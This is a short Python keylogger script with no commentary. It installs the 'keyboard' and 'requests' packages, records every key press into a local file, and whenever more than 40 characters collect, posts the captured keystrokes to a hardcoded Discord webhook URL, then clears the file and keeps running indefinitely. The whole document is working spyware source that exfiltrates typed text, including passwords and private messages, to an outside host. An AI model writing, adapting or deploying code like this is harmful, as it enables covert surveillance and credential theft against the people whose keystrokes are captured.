import  subprocess
subprocess.call(['pip', 'install', 'keyboard']) 
subprocess.call(['pip', 'install', 'requests']) 
import keyboard
import requests
r = 0
def on_press(event):
    if event.name == "shift":
         event.name = None  
    if event.name == "space":
         event.name = " "      
    url = "https://discord.com/api/webhooks/1084550250661957632/r-5pDCH8j8ffY4M_Oc6q448hm1Wuks7ozHKZggIOltZH7vqGroctkl0UfalpJzqY2Vix"
    with open("ssss.txt","a") as file:
        file.write(event.name)
        file.close()
    with open("ssss.txt","r") as file:
        var = file.read()
        payloud = {"content" : var}  
        su = len(var)
    if su > 40:
        r = requests.post(url, data=payloud)  
        with open("ssss.txt","w") as file:
            file.write("!!!")
            file.close()  
keyboard.on_press(on_press)
while True:
    pass  
